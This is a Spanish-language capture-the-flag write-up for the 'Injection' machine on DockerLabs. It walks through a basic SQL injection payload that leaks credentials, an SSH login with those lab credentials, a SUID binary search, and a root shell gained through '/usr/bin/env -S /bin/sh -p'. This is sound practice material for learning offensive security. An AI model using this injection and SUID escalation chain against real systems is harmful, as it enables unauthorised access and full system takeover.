# Write-up - Injection

**Dificultad:** Muy Fácil  
**Plataforma:** DockerLabs  
**Fecha:** 20/05/2025  
**Enseñanza:** Me permitió reforzar el análisis lógico y técnico para resolver la máquina de forma ordenada, identificando correctamente 
las fases de reconocimiento, explotación y escalada de privilegios.

---

## 1. Enumeración inicial

Se verifica la presencia de SQL Injection con una consulta básica:

`' or 1=1`

Esto devuelve un resultado con usuario y contraseña expuestos:

- Usuario: `Dylan`  
- Contraseña: `KJSDFG789FGSDF78`

---

## 2. Acceso SSH

Se accede por SSH utilizando las credenciales descubiertas:

`ssh -l Dylan <IP>`  
`Password: KJSDFG789FGSDF78`


---

## 3. Búsqueda de binarios con SUID

Se listan todos los archivos con el bit SUID activado:

`find / -perm -4000 -type f 2>/dev/null`


Resultado relevante:

`/usr/bin/env`


Se verifica si se ejecuta con permisos de root:

`ls -l /usr/bin/env`  
`-rwsr-xr-x 1 root root 43976 Jan 8 2024 /usr/bin/env `


---

## 4. Escalada de privilegios

Se intentan diferentes formas de ejecutar `/usr/bin/env`:

### Opción 1 (fallida):

`/usr/bin/env /bin/sh`


→ No otorga privilegios de root.

### Opción 2 (exitosa):

`/usr/bin/env -S /bin/sh -p`


Esto abre una shell como root.

---

## 5. Verificación

> whoami = root


---

## Conclusión

Máquina resuelta exitosamente mediante:

- SQL Injection básica  
- Acceso por SSH con credenciales expuestas  
- Escalada de privilegios mediante `env` con SUID y el flag `-p`

---
